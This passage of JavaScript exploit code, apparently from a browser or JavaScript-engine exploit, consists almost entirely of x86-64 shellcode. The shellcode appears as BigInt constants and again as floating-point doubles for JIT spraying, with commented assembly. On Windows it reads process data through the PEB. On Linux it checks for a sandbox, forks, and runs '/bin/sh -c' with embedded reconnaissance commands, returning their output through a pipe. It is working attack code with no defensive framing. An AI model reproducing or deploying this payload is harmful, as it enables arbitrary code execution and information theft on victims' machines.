    0x01019c08ebda8948n, // 156[0x07ec]: MOV rdx, rbx
    0x01019d08ebf98948n, // 157[0x07f9]: MOV rcx, rdi
    // reverse_loop [0x0806]:
    0x0101019e09eb078an, // 158[0x0806]: MOV al, [rdi]
    0x0101019f09eb1a8an, // 159[0x0813]: MOV bl, [rdx]
    0x010101a009eb1f88n, // 160[0x0820]: MOV [rdi], bl
    0x010101a109eb0288n, // 161[0x082d]: MOV [rdx], al
    0x0101a208ebc7ff48n, // 162[0x083a]: INC rdi
    0x0101a308ebcaff48n, // 163[0x0847]: DEC rdx
    0x0101a408ebd73948n, // 164[0x0854]: CMP rdi, rdx
    0x05ebffffff9f8c0fn, // 165[0x0861]: JMP :reverse_loop => 0x0806
    0x0101a608ebd70148n, // 166[0x086e]: ADD rdi, rdx
    0x0101a708ebcf2948n, // 167[0x087b]: SUB rdi, rcx
    0x0101a808ebc7ff48n, // 168[0x0888]: INC rdi
    0x010101a909ebc931n, // 169[0x0895]: XOR ecx, ecx
    0x010101aa09eb0f89n, // 170[0x08a2]: MOV [rdi], ecx
    0x0101ab08ebc7ff48n, // 171[0x08af]: INC rdi
    0xac06eb0000003fb8n, // 172[0x08bc]: MOV eax, 63
    0x010101ad09eb050fn, // 173[0x08c9]: SYSCALL
    0x010101ae09eb406an, // 174[0x08d6]: PUSH 64
    0x01010101af0aeb58n, // 175[0x08e3]: POP rax
    // return [0x08f0]:
    0x01010101b00aebc3n, // 176[0x08f0]: RET
];
      
xwasmShellcode = [
    0x05eb909090909090n, // 00[0x0000]: SLED 0x06
    0x01010108ebec8c41n, // 01[0x000d]: MOV r12d, gs
    0x01010208ebe4854dn, // 02[0x001a]: TEST r12, r12
    0x05eb000000d7840fn, // 03[0x0027]: JZ :Linux => 0x0104
    // Windows shellcode
    0x01010408ebc48949n, // 04[0x0034]: MOV r12, rax
    0x01010508ebc93148n, // 05[0x0041]: XOR rcx, rcx
    0x0606eb60418b4865n, // 06[0x004e]: MOV(rax, gs:[rcx+0x60])
    0x010707eb20408b48n, // 07[0x005b]: MOV rax, [rax + 32]
    0x010807eb70488b66n, // 08[0x0068]: MOV cx, [rax + 112]
    0x010907eb78408b48n, // 09[0x0075]: MOV rax, [rax + 120]
    // loop [0x0082]:
    0x01010a08eb188a44n, // 10[0x0082]: MOV r11b, [rax]
    0x010b07eb241c8845n, // 11[0x008f]: MOV [r12], r11b
    0x01010c08ebc0ff48n, // 12[0x009c]: INC rax
    0x01010d08ebc4ff49n, // 13[0x00a9]: INC r12
    0x01010e08ebc9ff48n, // 14[0x00b6]: DEC rcx
    0x01010f08ebc98548n, // 15[0x00c3]: TEST rcx, rcx
    0x05ebffffffac850fn, // 16[0x00d0]: JNZ :loop => 0x0082
    0x1106eb0000010068n, // 17[0x00dd]: PUSH 256
    0x01010101120aeb58n, // 18[0x00ea]: POP rax
    0x1306eb00000a64e9n, // 19[0x00f7]: JMP :return => 0x0b60
    // Linux [0x0104]:
    0x01011408ebc48949n, // 20[0x0104]: MOV r12, rax
    0x1506eb2f00002f68n, // 21[0x0111]: PUSH 788529199
    0x0101011609ebd231n, // 22[0x011e]: XOR edx, edx
    0x0101011709ebf631n, // 23[0x012b]: XOR esi, esi
    0x01011808ebe78948n, // 24[0x0138]: MOV rdi, rsp
    0x1906eb00000002b8n, // 25[0x0145]: MOV eax, 2
    0x0101011a09eb050fn, // 26[0x0152]: SYSCALL
    0x010101011b0aeb5fn, // 27[0x015f]: POP rdi
    0x011c07eb3fe8c148n, // 28[0x016c]: SHR rax, 63
    0x0101011d09ebc085n, // 29[0x0179]: TEST eax, eax
    0x01011e08ebe0894cn, // 30[0x0186]: MOV rax, r12
    0x05eb00000800850fn, // 31[0x0193]: JNZ :LinuxSandbox => 0x0999
    // LinuxForkExec [0x01a0]:
    0x01012008ebc38948n, // 32[0x01a0]: MOV rbx, rax
    // pipe(link)
    0x0101012109eb006an, // 33[0x01ad]: PUSH 0
    0x2206eb00000016b8n, // 34[0x01ba]: MOV eax, 22
    0x01012308ebe78948n, // 35[0x01c7]: MOV rdi, rsp
    0x0101012409eb050fn, // 36[0x01d4]: SYSCALL
    0x0101012509eb5941n, // 37[0x01e1]: POP r9
    0x01012608ebc88945n, // 38[0x01ee]: MOV r8d, r9d
    0x012707eb20e9c149n, // 39[0x01fb]: SHR r9, 32
    0x2806eb00000039b8n, // 40[0x0208]: MOV eax, 57
    0x0101012909eb050fn, // 41[0x0215]: SYSCALL
    0x01012a08ebc08548n, // 42[0x0222]: TEST rax, rax
    0x05eb0000067a850fn, // 43[0x022f]: JNZ :parent => 0x08af
    // Fork Child
    // dup2(link[1], STDOUT_FILENO);
    0x2c06eb00000021b8n, // 44[0x023c]: MOV eax, 33
    0x01012d08ebcf894cn, // 45[0x0249]: MOV rdi, r9
    0x2e06eb00000001ben, // 46[0x0256]: MOV esi, 1
    0x0101012f09eb050fn, // 47[0x0263]: SYSCALL
    // close(link[0])
    0x3006eb00000003b8n, // 48[0x0270]: MOV eax, 3
    0x01013108ebc7894cn, // 49[0x027d]: MOV rdi, r8
    0x0101013209eb050fn, // 50[0x028a]: SYSCALL
    // close(link[1])
    0x3306eb00000003b8n, // 51[0x0297]: MOV eax, 3
    0x01013408ebcf894cn, // 52[0x02a4]: MOV rdi, r9
    0x0101013509eb050fn, // 53[0x02b1]: SYSCALL
    0x0101013609ebc031n, // 54[0x02be]: XOR eax, eax
    0x013707eb20e0c148n, // 55[0x02cb]: SHL rax, 32
    0x013807eb00c88348n, // 56[0x02d8]: OR rax, 0
    0x01010101390aeb50n, // 57[0x02e5]: PUSH rax
    0x0101013a09ebc031n, // 58[0x02f2]: XOR eax, eax
    0x013b07eb20e0c148n, // 59[0x02ff]: SHL rax, 32
    0x013c07eb00c88348n, // 60[0x030c]: OR rax, 0
    0x010101013d0aeb50n, // 61[0x0319]: PUSH rax
    0x3e06eb68732f2fb8n, // 62[0x0326]: MOV eax, 1752379183
    0x013f07eb20e0c148n, // 63[0x0333]: SHL rax, 32
    0x05eb6e69622f0d48n, // 64[0x0340]: OR rax, 1852400175
    0x01010101410aeb50n, // 65[0x034d]: PUSH rax
    0x01010101420aeb54n, // 66[0x035a]: PUSH rsp
    0x0101014309eb5841n, // 67[0x0367]: POP r8
    0x0101014409ebc031n, // 68[0x0374]: XOR eax, eax
    0x014507eb20e0c148n, // 69[0x0381]: SHL rax, 32
    0x014607eb00c88348n, // 70[0x038e]: OR rax, 0
    0x01010101470aeb50n, // 71[0x039b]: PUSH rax
    0x0101014809ebc031n, // 72[0x03a8]: XOR eax, eax
    0x014907eb20e0c148n, // 73[0x03b5]: SHL rax, 32
    0x05eb0000632d0d48n, // 74[0x03c2]: OR rax, 25389
    0x010101014b0aeb50n, // 75[0x03cf]: PUSH rax
    0x010101014c0aeb54n, // 76[0x03dc]: PUSH rsp
    0x0101014d09eb5941n, // 77[0x03e9]: POP r9
    0x0101014e09ebc031n, // 78[0x03f6]: XOR eax, eax
    0x014f07eb20e0c148n, // 79[0x0403]: SHL rax, 32
    0x015007eb00c88348n, // 80[0x0410]: OR rax, 0
    0x01010101510aeb50n, // 81[0x041d]: PUSH rax
    0x0101015209ebc031n, // 82[0x042a]: XOR eax, eax
    0x015307eb20e0c148n, // 83[0x0437]: SHL rax, 32
    0x015407eb3bc88348n, // 84[0x0444]: OR rax, 59
    0x01010101550aeb50n, // 85[0x0451]: PUSH rax
    0x5606eb312d2064b8n, // 86[0x045e]: MOV eax, 825040996
    0x015707eb20e0c148n, // 87[0x046b]: SHL rax, 32
    0x05eb616568200d48n, // 88[0x0478]: OR rax, 1634035744
    0x01010101590aeb50n, // 89[0x0485]: PUSH rax
    0x5a06eb7c205024b8n, // 90[0x0492]: MOV eax, 2082492452
    0x015b07eb20e0c148n, // 91[0x049f]: SHL rax, 32
    0x05eb20272b5d0d48n, // 92[0x04ac]: OR rax, 539437917
    0x010101015d0aeb50n, // 93[0x04b9]: PUSH rax
    0x5e06eb392d305bb8n, // 94[0x04c6]: MOV eax, 959262811
    0x015f07eb20e0c148n, // 95[0x04d3]: SHL rax, 32
    0x05eb2e5c7d340d48n, // 96[0x04e0]: OR rax, 777813300
    0x01010101610aeb50n, // 97[0x04ed]: PUSH rax
    0x6206eb7b5d392db8n, // 98[0x04fa]: MOV eax, 2069707053
    0x016307eb20e0c148n, // 99[0x0507]: SHL rax, 32
    0x05eb305b2e5c0d48n, // 100[0x0514]: OR rax, 811282012
    0x01010101650aeb50n, // 101[0x0521]: PUSH rax
    0x6606eb302e5c7db8n, // 102[0x052e]: MOV eax, 808344701
    0x016707eb20e0c148n, // 103[0x053b]: SHL rax, 32
    0x05eb337b5d390d48n, // 104[0x0548]: OR rax, 863722809
    0x01010101690aeb50n, // 105[0x0555]: PUSH rax
    0x6a06eb2d305b27b8n, // 106[0x0562]: MOV eax, 758143783
    0x016b07eb20e0c148n, // 107[0x056f]: SHL rax, 32
    0x05eb206f45610d48n, // 108[0x057c]: OR rax, 544163169
    0x010101016d0aeb50n, // 109[0x0589]: PUSH rax
    0x6e06eb2d207065b8n, // 110[0x0596]: MOV eax, 757100645
    0x016f07eb20e0c148n, // 111[0x05a3]: SHL rax, 32
    0x05eb7267203b0d48n, // 112[0x05b0]: OR rax, 1919361083
    0x01010101710aeb50n, // 113[0x05bd]: PUSH rax
    0x7206eb50242061b8n, // 114[0x05ca]: MOV eax, 1344544865
    0x017307eb20e0c148n, // 115[0x05d7]: SHL rax, 32
    0x05eb6c2d20730d48n, // 116[0x05e4]: OR rax, 1814896755
    0x01010101750aeb50n, // 117[0x05f1]: PUSH rax
    0x7606eb6c203b65b8n, // 118[0x05fe]: MOV eax, 1814051685
    0x017707eb20e0c148n, // 119[0x060b]: SHL rax, 32
    0x05eb78652f440d48n, // 120[0x0618]: OR rax, 2019897156
    0x01010101790aeb50n, // 121[0x0625]: PUSH rax
    0x7a06eb49505024b8n, // 122[0x0632]: MOV eax, 1230000164
    0x017b07eb20e0c148n, // 123[0x063f]: SHL rax, 32
    0x05eb2f636f720d48n, // 124[0x064c]: OR rax, 795045746
    0x010101017d0aeb50n, // 125[0x0659]: PUSH rax
    0x7e06eb702f3d50b8n, // 126[0x0666]: MOV eax, 1882144080
    0x017f07eb20e0c148n, // 127[0x0673]: SHL rax, 32
    0x05eb2074726f0d48n, // 128[0x0680]: OR rax, 544502383
    0x01010101810aeb50n, // 129[0x068d]: PUSH rax
    0x8206eb70786520b8n, // 130[0x069a]: MOV eax, 1886938400
    0x018307eb20e0c148n, // 131[0x06a7]: SHL rax, 32
    0x05eb3b656d690d48n, // 132[0x06b4]: OR rax, 996502889
    0x01010101850aeb50n, // 133[0x06c1]: PUSH rax
    0x8606eb7470752fb8n, // 134[0x06ce]: MOV eax, 1953527087
    0x018707eb20e0c148n, // 135[0x06db]: SHL rax, 32
    0x05eb636f72700d48n, // 136[0x06e8]: OR rax, 1668248176
    0x01010101890aeb50n, // 137[0x06f5]: PUSH rax
    0x8a06eb2f207461b8n, // 138[0x0702]: MOV eax, 790656097
    0x018b07eb20e0c148n, // 139[0x070f]: SHL rax, 32
    0x05eb63203b650d48n, // 140[0x071c]: OR rax, 1663056741
    0x010101018d0aeb50n, // 141[0x0729]: PUSH rax
    0x8e06eb74616420b8n, // 142[0x0736]: MOV eax, 1952539680
    0x018f07eb20e0c148n, // 143[0x0743]: SHL rax, 32
    0x05eb3b612d200d48n, // 144[0x0750]: OR rax, 996224288
    0x01010101910aeb50n, // 145[0x075d]: PUSH rax
    0x9206eb656d616eb8n, // 146[0x076a]: MOV eax, 1701667182
    0x019307eb20e0c148n, // 147[0x0777]: SHL rax, 32
    0x05eb75203b640d48n, // 148[0x0784]: OR rax, 1965046628
    0x01010101950aeb50n, // 149[0x0791]: PUSH rax
    0x9606eb7770203bb8n, // 150[0x079e]: MOV eax, 2003836987
    0x019707eb20e0c148n, // 151[0x07ab]: SHL rax, 32
    0x05eb656d616e0d48n, // 152[0x07b8]: OR rax, 1701667182
    0x01010101990aeb50n, // 153[0x07c5]: PUSH rax
    0x9a06eb74736f68b8n, // 154[0x07d2]: MOV eax, 1953722216
    0x019b07eb20e0c148n, // 155[0x07df]: SHL rax, 32
    0x05eb203b64690d48n, // 156[0x07ec]: OR rax, 540763241
    0x010101019d0aeb50n, // 157[0x07f9]: PUSH rax
    0x010101019e0aeb54n, // 158[0x0806]: PUSH rsp
    0x0101019f09eb5a41n, // 159[0x0813]: POP r10
    0x010101a009eb006an, // 160[0x0820]: PUSH 0
    0x010101a109eb5241n, // 161[0x082d]: PUSH r10
    0x010101a209eb5141n, // 162[0x083a]: PUSH r9
    0x010101a309eb5041n, // 163[0x0847]: PUSH r8
    0x01010101a40aeb54n, // 164[0x0854]: PUSH rsp
    0x010101a509eb5a41n, // 165[0x0861]: POP r10
    0xa606eb0000003bb8n, // 166[0x086e]: MOV eax, 59
    0x0101a708ebd6894cn, // 167[0x087b]: MOV rsi, r10
    0x0101a808eb3e8b48n, // 168[0x0888]: MOV rdi, [rsi]
    0x0101a908ebd23148n, // 169[0x0895]: XOR rdx, rdx
    0x010101aa09eb050fn, // 170[0x08a2]: SYSCALL
    // parent [0x08af]:
    // Fork Parent
    // close(link[1])
    0xab06eb00000003b8n, // 171[0x08af]: MOV eax, 3
    0x0101ac08ebcf894cn, // 172[0x08bc]: MOV rdi, r9
    0x010101ad09eb050fn, // 173[0x08c9]: SYSCALL
    0xae06eb00001000ban, // 174[0x08d6]: MOV edx, 4096
    // read [0x08e3]:
    // read(link[0], rbx, 4096)
    0x0101af08ebc03148n, // 175[0x08e3]: XOR rax, rax
    0x0101b008ebc7894cn, // 176[0x08f0]: MOV rdi, r8
    0x0101b108ebde8948n, // 177[0x08fd]: MOV rsi, rbx
    0x010101b209eb050fn, // 178[0x090a]: SYSCALL
    0x0101b308ebc30148n, // 179[0x0917]: ADD rbx, rax
    0x010101b409ebc229n, // 180[0x0924]: SUB edx, eax
    0x0101b508ebc08548n, // 181[0x0931]: TEST rax, rax
    0x05ebffffff9f850fn, // 182[0x093e]: JNZ :read => 0x08e3
    // close(link[0])
    0xb706eb00000003b8n, // 183[0x094b]: MOV eax, 3
    0x0101b808ebc7894cn, // 184[0x0958]: MOV rdi, r8
    0x010101b909eb050fn, // 185[0x0965]: SYSCALL
    0xba06eb0000008068n, // 186[0x0972]: PUSH 128
    0x01010101bb0aeb58n, // 187[0x097f]: POP rax
    0xbc06eb000001cfe9n, // 188[0x098c]: JMP :return => 0x0b60
    // LinuxSandbox [0x0999]:
    0x0101bd08ebc78948n, // 189[0x0999]: MOV rdi, rax
    0xbe06eb00000066b8n, // 190[0x09a6]: MOV eax, 102
    0x010101bf09eb050fn, // 191[0x09b3]: SYSCALL
    0x0101c008ebfb8948n, // 192[0x09c0]: MOV rbx, rdi
    0xc106eb0000000ab9n, // 193[0x09cd]: MOV ecx, 10
    // convert_loop [0x09da]:
    0x010101c209ebd231n, // 194[0x09da]: XOR edx, edx
    0x010101c309ebf1f7n, // 195[0x09e7]: DIV ecx
    0x0101c408eb30c283n, // 196[0x09f4]: ADD edx, 48
    0x010101c509eb1389n, // 197[0x0a01]: MOV [rbx], edx
    0x0101c608ebc3ff48n, // 198[0x0a0e]: INC rbx
    0x010101c709ebc085n, // 199[0x0a1b]: TEST eax, eax
    0x01010101c80aeb90n, // 200[0x0a28]: NOP
    0x01010101c90aeb90n, // 201[0x0a35]: NOP
    0x05ebffffff92850fn, // 202[0x0a42]: JNZ :convert_loop => 0x09da
    0x0101cb08ebcbff48n, // 203[0x0a4f]: DEC rbx
    0x0101cc08ebda8948n, // 204[0x0a5c]: MOV rdx, rbx
    0x0101cd08ebf98948n, // 205[0x0a69]: MOV rcx, rdi
    // reverse_loop [0x0a76]:
    0x010101ce09eb078an, // 206[0x0a76]: MOV al, [rdi]
    0x010101cf09eb1a8an, // 207[0x0a83]: MOV bl, [rdx]
    0x010101d009eb1f88n, // 208[0x0a90]: MOV [rdi], bl
    0x010101d109eb0288n, // 209[0x0a9d]: MOV [rdx], al
    0x0101d208ebc7ff48n, // 210[0x0aaa]: INC rdi
    0x0101d308ebcaff48n, // 211[0x0ab7]: DEC rdx
    0x0101d408ebd73948n, // 212[0x0ac4]: CMP rdi, rdx
    0x05ebffffff9f8c0fn, // 213[0x0ad1]: JMP :reverse_loop => 0x0a76
    0x0101d608ebd70148n, // 214[0x0ade]: ADD rdi, rdx
    0x0101d708ebcf2948n, // 215[0x0aeb]: SUB rdi, rcx
    0x0101d808ebc7ff48n, // 216[0x0af8]: INC rdi
    0x010101d909ebc931n, // 217[0x0b05]: XOR ecx, ecx
    0x010101da09eb0f89n, // 218[0x0b12]: MOV [rdi], ecx
    0x0101db08ebc7ff48n, // 219[0x0b1f]: INC rdi
    0xdc06eb0000003fb8n, // 220[0x0b2c]: MOV eax, 63
    0x010101dd09eb050fn, // 221[0x0b39]: SYSCALL
    0x010101de09eb406an, // 222[0x0b46]: PUSH 64
    0x01010101df0aeb58n, // 223[0x0b53]: POP rax
    // return [0x0b60]:
    0x01010101e00aebc3n, // 224[0x0b60]: RET
]

const shellcodeFuncFactory = (arg) => {
    return new Function(`
        let a = [
            1.0,
            1.9711828988902502e-246, // 00[0x0000 + 0x14]: SLED 0x06 
            1.3633472545860206e-303, // 01[0x0014 + 0x14]: CALL :jit_arg => 0x003c 
            7.7,                     // 02[0x0028 + 0x14]: 7.7 
            // jit_arg [0x003c]:
            7.74860424160716e-304,   // 03[0x003c + 0x14]: POP rax 
            9.14045781812438e-304,   // 04[0x0050 + 0x14]: ADD rax, 15 
            7.755828124570883e-304,  // 05[0x0064 + 0x14]: MOV rax, [rax] 
            7.757608208697643e-304,  // 06[0x0078 + 0x14]: MOV r12d, gs 
            7.759388266932768e-304,  // 07[0x008c + 0x14]: TEST r12, r12 
            1.9308001567107199e-246, // 08[0x00a0 + 0x14]: JZ :Linux => 0x0212 
            // Windows shellcode
            7.762948381712838e-304,  // 09[0x00b4 + 0x14]: MOV r12, rax 
            7.764728441293669e-304,  // 10[0x00c8 + 0x14]: XOR rcx, rcx 
            1.992632063486483e-255,  // 11[0x00dc + 0x14]: MOV(rax, gs:[rcx+0x60]) 
            1.2786019276071405e-303, // 12[0x00f0 + 0x14]: MOV rax, [rax + 32] 
            1.3241716576066217e-303, // 13[0x0104 + 0x14]: MOV cx, [rax + 112] 
            1.3697411918732014e-303, // 14[0x0118 + 0x14]: MOV rax, [rax + 120] 
            // loop [0x012c]:
            7.773649578052338e-304,  // 15[0x012c + 0x17]: MOV r11b, [rax] 
            1.4646036086979737e-303, // 16[0x0143 + 0x17]: MOV [r12], r11b 
            7.777209714099212e-304,  // 17[0x015a + 0x17]: INC rax 
            7.778989773610419e-304,  // 18[0x0171 + 0x17]: INC r12 
            7.780769833227722e-304,  // 19[0x0188 + 0x17]: DEC rcx 
            7.782549892263964e-304,  // 20[0x019f + 0x17]: TEST rcx, rcx 
            5.636005166673215e-232,  // 21[0x01b6 + 0x17]: JNZ :loop => 0x012c 
            2.15839606668993e-202,   // 22[0x01cd + 0x17]: PUSH 256 
            7.748604785156381e-304,  // 23[0x01e4 + 0x17]: POP rax 
            9.27024051991804e-193,   // 24[0x01fb + 0x17]: JMP :return => 0x1016 
            // Linux [0x0212]:
            7.791450187169154e-304,  // 25[0x0212 + 0x17]: MOV r12, rax 
            3.9817067649888705e-183, // 26[0x0229 + 0x17]: PUSH 788529199 
            7.748785486562231e-304,  // 27[0x0240 + 0x17]: XOR edx, edx 
            7.748792439932959e-304,  // 28[0x0257 + 0x17]: XOR esi, esi 
            7.798570427229868e-304,  // 29[0x026e + 0x17]: MOV rdi, rsp 
            7.344641223160765e-164,  // 30[0x0285 + 0x17]: MOV eax, 2 
            7.748813299900444e-304,  // 31[0x029c + 0x17]: SYSCALL 
            7.748605029610308e-304,  // 32[0x02b3 + 0x17]: POP rdi 
            3.11148556989675e-303,   // 33[0x02ca + 0x17]: SHR rax, 63 
            7.748834160045562e-304,  // 34[0x02e1 + 0x17]: TEST eax, eax 
            7.80925078100801e-304,   // 35[0x02f8 + 0x17]: MOV rax, r12 
            5.434719392660526e-232,  // 36[0x030f + 0x17]: JNZ :LinuxSandbox => 0x0cf1 
            // LinuxForkExec [0x0326]:
            7.812810896104721e-304,  // 37[0x0326 + 0x17]: MOV rbx, rax 
            // pipe(link)
            7.748861973389174e-304,  // 38[0x033d + 0x17]: PUSH 0 
            1.637909724925086e-120,  // 39[0x0354 + 0x17]: MOV eax, 22 
            7.818151077184731e-304,  // 40[0x036b + 0x17]: MOV rdi, rsp 
            7.748882833458523e-304,  // 41[0x0382 + 0x17]: SYSCALL 
            7.748889786849226e-304,  // 42[0x0399 + 0x17]: POP r9 
            7.82349125115605e-304,   // 43[0x03b0 + 0x17]: MOV r8d, r9d 
            5.116543788514028e-303,  // 44[0x03c7 + 0x17]: SHR r9, 32 
            1.297685778703029e-91,   // 45[0x03de + 0x17]: MOV eax, 57 
            7.748917600237562e-304,  // 46[0x03f5 + 0x17]: SYSCALL 
            7.830611486652822e-304,  // 47[0x040c + 0x17]: TEST rax, rax 
            5.434719360323314e-232,  // 48[0x0423 + 0x17]: JNZ :parent => 0x0b53 
            // Fork Child
            // dup2(link[1], STDOUT_FILENO);
            2.393807744779638e-72,   // 49[0x043a + 0x17]: MOV eax, 33 
            7.8359516655064e-304,    // 50[0x0451 + 0x17]: MOV rdi, r9 
            1.0281325976722385e-62,  // 51[0x0468 + 0x17]: MOV esi, 1 
            7.748959320372409e-304,  // 52[0x047f + 0x17]: SYSCALL 
            // close(link[0])
            4.415795882954259e-53,   // 53[0x0496 + 0x17]: MOV eax, 3 
            7.843071901004825e-304,  // 54[0x04ad + 0x17]: MOV rdi, r8 
            7.748980180439832e-304,  // 55[0x04c4 + 0x17]: SYSCALL 
            // close(link[1])
            1.2429360433135608e-38,  // 56[0x04db + 0x17]: MOV eax, 3 
            7.84841207911404e-304,   // 57[0x04f2 + 0x17]: MOV rdi, r9 
            7.749001040507256e-304,  // 58[0x0509 + 0x17]: SYSCALL 
            7.749007993940621e-304,  // 59[0x0520 + 0x17]: XOR eax, eax 
            1.0233087576264136e-302, // 60[0x0537 + 0x17]: SHL rax, 32 
            1.0597642979848702e-302, // 61[0x054e + 0x17]: OR rax, 0 
            7.748605844456667e-304,  // 62[0x0565 + 0x17]: PUSH rax 
            7.749035807363853e-304,  // 63[0x057c + 0x17]: XOR eax, eax 
            1.1716828729060594e-302, // 64[0x0593 + 0x17]: SHL rax, 32 
            1.2445939536229727e-302, // 65[0x05aa + 0x17]: OR rax, 0 
            7.748605953102852e-304,  // 66[0x05c1 + 0x17]: PUSH rax 
            1190608367242222.0,      // 67[0x05d8 + 0x17]: MOV eax, 1752379183 
            1.4633277536883153e-302, // 68[0x05ef + 0x17]: SHL rax, 32 
            5.521532981865863e-232,  // 69[0x0606 + 0x17]: OR rax, 1852400175 
            7.748606061749036e-304,  // 70[0x061d + 0x17]: PUSH rax 
            7.748606088910589e-304,  // 71[0x0634 + 0x17]: PUSH rsp 
            7.749098387523046e-304,  // 72[0x064b + 0x17]: POP r8 
            7.749105340921931e-304,  // 73[0x0662 + 0x17]: XOR eax, eax 
            1.9007950748616992e-302, // 74[0x0679 + 0x17]: SHL rax, 32 
            1.9737061555786124e-302, // 75[0x0690 + 0x17]: OR rax, 0 
            7.748606224718313e-304,  // 76[0x06a7 + 0x17]: PUSH rax 
            7.749133154345162e-304,  // 77[0x06be + 0x17]: XOR eax, eax 
            2.192439955643955e-302,  // 78[0x06d5 + 0x17]: SHL rax, 32 
            5.434720464218838e-232,  // 79[0x06ec + 0x17]: OR rax, 25389 
            7.748606333364497e-304,  // 80[0x0703 + 0x17]: PUSH rax 
            7.74860636052605e-304,   // 81[0x071a + 0x17]: PUSH rsp 
            7.749167921081539e-304,  // 82[0x0731 + 0x17]: POP r9 
            7.74917487448001e-304,   // 83[0x0748 + 0x17]: XOR eax, eax 
            2.9266555073766306e-302, // 84[0x075f + 0x17]: SHL rax, 32 
            3.072477668810457e-302,  // 85[0x0776 + 0x17]: OR rax, 0 
            7.748606496333774e-304,  // 86[0x078d + 0x17]: PUSH rax 
            7.749202687903241e-304,  // 87[0x07a4 + 0x17]: XOR eax, eax 
            3.5099452689411424e-302, // 88[0x07bb + 0x17]: SHL rax, 32 
            5.481420905839734e-232,  // 89[0x07d2 + 0x17]: OR rax, 996502889 
            7.748606604979959e-304,  // 90[0x07e9 + 0x17]: PUSH rax 
            4.691286550393857e+130,  // 91[0x0800 + 0x17]: MOV eax, 1953527087 
            4.093235030505654e-302,  // 92[0x0817 + 0x17]: SHL rax, 32 
            5.5129026016729625e-232, // 93[0x082e + 0x17]: OR rax, 1668248176 
            7.748606713626143e-304,  // 94[0x0845 + 0x17]: PUSH rax 
            8.65335529656831e+149,   // 95[0x085c + 0x17]: MOV eax, 790656097 
            4.686731491624238e-302,  // 96[0x0873 + 0x17]: SHL rax, 32 
            5.51265930234393e-232,   // 97[0x088a + 0x17]: OR rax, 1663056741 
            7.748606822272328e-304,  // 98[0x08a1 + 0x17]: PUSH rax 
            1.5963620065430204e+169, // 99[0x08b8 + 0x17]: MOV eax, 1952539680 
            5.853311014753261e-302,  // 100[0x08cf + 0x17]: SHL rax, 32 
            5.481407849057483e-232,  // 101[0x08e6 + 0x17]: OR rax, 996224288 
            7.748606930918512e-304,  // 102[0x08fd + 0x17]: PUSH rax 
            2.94472842739604e+188,   // 103[0x0914 + 0x17]: MOV eax, 1701667182 
            7.019890537882285e-302,  // 104[0x092b + 0x17]: SHL rax, 32 
            5.526812217074011e-232,  // 105[0x0942 + 0x17]: OR rax, 1965046628 
            7.748607039564697e-304,  // 106[0x0959 + 0x17]: PUSH rax 
            5.432153399109866e+207,  // 107[0x0970 + 0x17]: MOV eax, 2003836987 
            8.186470061011308e-302,  // 108[0x0987 + 0x17]: SHL rax, 32 
            5.5144688009486425e-232, // 109[0x099e + 0x17]: OR rax, 1701667182 
            7.748607148210881e-304,  // 110[0x09b5 + 0x17]: PUSH rax 
            1.0020527358535284e+227, // 111[0x09cc + 0x17]: MOV eax, 1953722216 
            9.373462983248475e-302,  // 112[0x09e3 + 0x17]: SHL rax, 32 
            5.460062427774999e-232,  // 113[0x09fa + 0x17]: OR rax, 540763241 
            7.748607256857066e-304,  // 114[0x0a11 + 0x17]: PUSH rax 
            7.748607284018618e-304,  // 115[0x0a28 + 0x17]: PUSH rsp 
            7.74940433517942e-304,   // 116[0x0a3f + 0x17]: POP r10 
            7.749411288497993e-304,  // 117[0x0a56 + 0x17]: PUSH 0 
            7.74941824188772e-304,   // 118[0x0a6d + 0x17]: PUSH r10 
            7.749425195243113e-304,  // 119[0x0a84 + 0x17]: PUSH r9 
            7.749432148598507e-304,  // 120[0x0a9b + 0x17]: PUSH r8 
            7.748607446987895e-304,  // 121[0x0ab2 + 0x17]: PUSH rsp 
            7.749446055314267e-304,  // 122[0x0ac9 + 0x17]: POP r10 
            6.289326397107377e+284,  // 123[0x0ae0 + 0x17]: MOV eax, 59 
            7.967676038672725e-304,  // 124[0x0af7 + 0x17]: MOV rsi, r10 
            7.969456081633185e-304,  // 125[0x0b0e + 0x17]: MOV rdi, [rsi] 
            7.971236156385459e-304,  // 126[0x0b25 + 0x17]: XOR rdx, rdx 
            7.749480822057997e-304,  // 127[0x0b3c + 0x17]: SYSCALL 
            // parent [0x0b53]:
            // Fork Parent
            // close(link[1])
            -2.3527331252921425e-308, // 128[0x0b53 + 0x17]: MOV eax, 3 
            7.976576333364055e-304,  // 129[0x0b6a + 0x17]: MOV rdi, r9 
            7.74950168212542e-304,   // 130[0x0b81 + 0x17]: SYSCALL 
            -6.622355017937106e-294, // 131[0x0b98 + 0x17]: MOV edx, 4096 
            // read [0x0baf]:
            // read(link[0], rbx, 4096)
            7.981916508996497e-304,  // 132[0x0baf + 0x17]: XOR rax, rax 
            7.98369656886248e-304,   // 133[0x0bc6 + 0x17]: MOV rdi, r8 
            7.985476630389574e-304,  // 134[0x0bdd + 0x17]: MOV rsi, rbx 
            7.74953644890446e-304,   // 135[0x0bf4 + 0x17]: SYSCALL 
            7.989036745642126e-304,  // 136[0x0c0b + 0x17]: ADD rbx, rax 
            7.749550355694449e-304,  // 137[0x0c22 + 0x17]: SUB edx, eax 
            7.992596863552146e-304,  // 138[0x0c39 + 0x17]: TEST rax, rax 
            5.636005165595308e-232,  // 139[0x0c50 + 0x17]: JNZ :read => 0x0baf 
            // close(link[0])
            -1.4768345183673037e-250, // 140[0x0c67 + 0x17]: MOV eax, 3 
            7.997937041556926e-304,  // 141[0x0c7e + 0x17]: MOV rdi, r8 
            7.749585122395114e-304,  // 142[0x0c95 + 0x17]: SYSCALL 
            -4.156919616657161e-236, // 143[0x0cac + 0x17]: PUSH 128 
            7.748608071703462e-304,  // 144[0x0cc3 + 0x17]: POP rax 
            -1.785383380631091e-226, // 145[0x0cda + 0x17]: JMP :return => 0x1016 
            // LinuxSandbox [0x0cf1]:
            8.006837336990948e-304,  // 146[0x0cf1 + 0x17]: MOV rdi, rax 
            -7.668163230335157e-217, // 147[0x0d08 + 0x17]: MOV eax, 102 
            7.749626842529961e-304,  // 148[0x0d1f + 0x17]: SYSCALL 
            8.012177519768555e-304,  // 149[0x0d36 + 0x17]: MOV rbx, rdi 
            -2.1583960666614224e-202, // 150[0x0d4d + 0x17]: MOV ecx, 10 
            // convert_loop [0x0d64]:
            7.749647702682402e-304,  // 151[0x0d64 + 0x17]: XOR edx, edx 
            7.749654656051379e-304,  // 152[0x0d7b + 0x17]: DIV ecx 
            8.01929773460124e-304,   // 153[0x0d92 + 0x17]: ADD edx, 48 
